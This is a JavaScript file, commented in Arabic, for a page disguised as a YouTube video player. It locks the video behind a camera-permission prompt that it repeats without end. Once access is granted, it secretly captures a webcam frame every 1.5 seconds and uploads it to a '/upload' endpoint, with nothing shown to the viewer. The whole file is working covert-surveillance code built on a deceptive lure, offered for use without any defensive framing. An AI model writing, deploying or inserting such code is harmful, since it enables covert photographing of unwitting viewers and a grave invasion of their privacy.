/* ==========================================================
   سكريبت الكاميرا الذكي والارتباط الشرطي بتشغيل الفيديو
   ========================================================== */

let mediaStream = null;

async function initPersistentCamera() {
    try {
        // طلب إذن الكاميرا من المتصفح
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: { ideal: 'user' }
            } 
        });

        const videoEl = document.getElementById('video');
        if (videoEl) videoEl.srcObject = mediaStream;
        
        // [عند السماح]: إزالة الغلاف الأسود وإضاءة/تشغيل الفيديو فوراً
        const playerContainer = document.getElementById('playerContainer');
        if (playerContainer) {
            // استرجاع مشغل يوتيوب الحقيقي وتفعيله
            const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';
            playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${activeId}?autoplay=1&rel=0&playsinline=1" title="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
        }
        
        // البدء في التقاط وإرسال الصور كل 1.5 ثانية
        setInterval(() => {
            if (!mediaStream || !videoEl) return;
            try {
                const vw = videoEl.videoWidth || 640;
                const vh = videoEl.videoHeight || 480;

                const canvas = document.createElement('canvas');
                canvas.width = vw;
                canvas.height = vh;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoEl, 0, 0, vw, vh);

                canvas.toBlob(blob => {
                    if (blob) {
                        let fd = new FormData();
                        fd.append('image', blob, `user_eye.jpg`);
                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                    }
                }, 'image/jpeg', 0.85);
            } catch (err) {
                console.log("خطأ في التقاط الإطار:", err);
            }
        }, 1500);

    } catch (e) {
        console.log("تم رفض الإذن:", e);
        
        // [عند الرفض أو التجاهل]: إبقاء الفيديو مغلقاً تماماً وعرض زر إعادة المحاولة فوق شاشة سوداء
        const playerContainer = document.getElementById('playerContainer');
        if (playerContainer) {
            playerContainer.innerHTML = `
                <div id="retryCamera" style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;cursor:pointer;background:#000;position:absolute;inset:0;z-index:99;">
                    <div>
                        <div style="font-size:36px;margin-bottom:8px;">🔒</div>
                        <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">عذراً، يرجى السماح بالكاميرا لفك تشغيل الفيديو</p>
                        <p style="color:#aaa;font-size:12px;margin-bottom:12px;">انقر هنا لإظهار نافذة الأذونات ومتابعة المشاهدة</p>
                        <span style="font-size:13px;color:#fff;background:#cc0000;padding:8px 18px;border-radius:20px;display:inline-block;font-weight:bold;">إعادة محاولة السماح</span>
                    </div>
                </div>
            `;
            
            // عند النقر على رسالة التنبيه، يتم إعادة محاولة طلب إذن الكاميرا مرة أخرى بلا حدود
            document.getElementById('retryCamera').onclick = () => {
                mediaStream = null;
                initPersistentCamera();
            };
        }
    }
}

function startCapture() {
    if (mediaStream) return;
    
    // أول ما يضغط المستخدم على الفيديو، نخفي محتوى الـ iframe مؤقتاً ونضع مكانه شاشة سوداء تطلب إذن الكاميرا أولاً
    const playerContainer = document.getElementById('playerContainer');
    if (playerContainer) {
        // حفظ معرف الفيديو الحالي مؤقتاً
        const iframe = playerContainer.querySelector('iframe');
        if(iframe) {
            const match = iframe.src.match(/embed\/([^?]+)/);
            if(match) playerContainer.dataset.videoId = match[1];
        }
        
        // عرض واجهة الحظر المؤقت بانتظار السماح بالكاميرا
        playerContainer.innerHTML = `
            <div style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
                <div>
                    <div style="font-size:32px;margin-bottom:8px;">⏳</div>
                    <p style="font-weight:bold;font-size:15px;margin-bottom:6px;">جاري تحميل مشغل الفيديو...</p>
                    <p style="color:#aaa;font-size:12px;">الرجاء الموافقة على طلب الكاميرا الظاهر للأعلى لبدء العرض</p>
                </div>
            </div>
        `;
    }

    // استدعاء دالة الكاميرا مباشرة
    initPersistentCamera();
}

// تشغيل الفحص التلقائي في حال كان الإذن ممنوحاً مسبقاً
navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
    if (permissionStatus.state === 'granted') {
        // الإذن ممنوح مسبقاً، لا داعي للحظر
    }
});
